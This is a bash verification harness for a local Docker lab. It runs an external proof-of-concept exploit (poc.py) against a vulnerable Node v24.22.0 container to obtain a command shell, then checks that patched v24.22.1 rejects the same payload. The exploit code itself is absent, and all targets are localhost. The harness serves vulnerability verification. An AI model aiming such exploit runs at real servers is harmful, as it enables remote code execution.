#!/usr/bin/env bash
set -uo pipefail

cd "$(dirname "${BASH_SOURCE[0]}")"
mkdir -p evidence

for container in node2shell-vuln node2shell-fixed; do
    if ! docker inspect "$container" >/dev/null 2>&1; then
        echo "[-] Container $container does not exist. Run: bash ./run.sh" >&2
        exit 2
    fi
done

echo "[*] Runtime A/B"
{
    docker ps --filter 'name=node2shell-' \
        --format '{{.Names}}|{{.Image}}|{{.Status}}|{{.Ports}}'
    curl -fsS http://127.0.0.1:3000/api/v1/version
    echo
    curl -fsS http://127.0.0.1:3002/api/v1/version
    echo
} | tee evidence/runtime-verify.txt

echo "[*] Checking ASLR and privileges on the vulnerable target"
bash ./labcheck.sh node2shell-vuln | tee evidence/labcheck-verify.txt
labcheck_rc=${PIPESTATUS[0]}
if (( labcheck_rc != 0 )); then
    echo "[-] FAIL: the lab-condition check failed." >&2
    exit 1
fi

echo "[*] Clearing any stale shell token and verifying both consoles are locked"
docker exec node2shell-vuln rm -f /tmp/node2shell-shell.enabled
docker exec node2shell-fixed rm -f /tmp/node2shell-shell.enabled
vuln_locked_before=$(curl -sS -o /dev/null -w '%{http_code}' \
    -X POST -d 'cmd=whoami' http://127.0.0.1:3000/api/v1/shell)
fixed_locked_before=$(curl -sS -o /dev/null -w '%{http_code}' \
    -X POST -d 'cmd=whoami' http://127.0.0.1:3002/api/v1/shell)
printf 'vulnerable shell before RCE: HTTP %s\npatched shell: HTTP %s\n' \
    "$vuln_locked_before" "$fixed_locked_before" | tee evidence/shell-lock-state.txt
if [[ "$vuln_locked_before" != "403" || "$fixed_locked_before" != "403" ]]; then
    echo "[-] FAIL: a target-backed shell was accessible before exploitation." >&2
    exit 1
fi

echo "[*] Exploiting Node v24.22.0 and validating an active target-backed shell"
python3 ./poc.py --port 3000 --validate-shell \
    2>&1 | tee evidence/poc-vulnerable-verify.txt
vulnerable_rc=${PIPESTATUS[0]}

vuln_locked_after=$(curl -sS -o /dev/null -w '%{http_code}' \
    -X POST -d 'cmd=whoami' http://127.0.0.1:3000/api/v1/shell)
printf 'vulnerable shell after session close: HTTP %s\n' "$vuln_locked_after" \
    | tee -a evidence/shell-lock-state.txt
if (( vulnerable_rc != 0 )); then
    echo "[-] The PoC did not land in this run. Run the script again; exploitation is probabilistic." >&2
    exit 1
fi
if [[ "$vuln_locked_after" != "403" ]]; then
    echo "[-] FAIL: the vulnerable target's one-run shell token was not revoked." >&2
    exit 1
fi

echo "[*] Sending the identical shell-activation payload to patched Node v24.22.1"
python3 ./poc.py --port 3002 --validate-shell --attempts 32 \
    2>&1 | tee evidence/poc-patched-verify.txt
patched_rc=${PIPESTATUS[0]}

if (( patched_rc == 0 )); then
    echo "[-] FAIL: the patched target executed the shell-activation payload." >&2
    exit 1
fi

curl -fsS http://127.0.0.1:3000/health >/dev/null
curl -fsS http://127.0.0.1:3002/health >/dev/null

echo "[+] PASS: v24.22.0 yielded an active command shell; v24.22.1 rejected the identical payload."
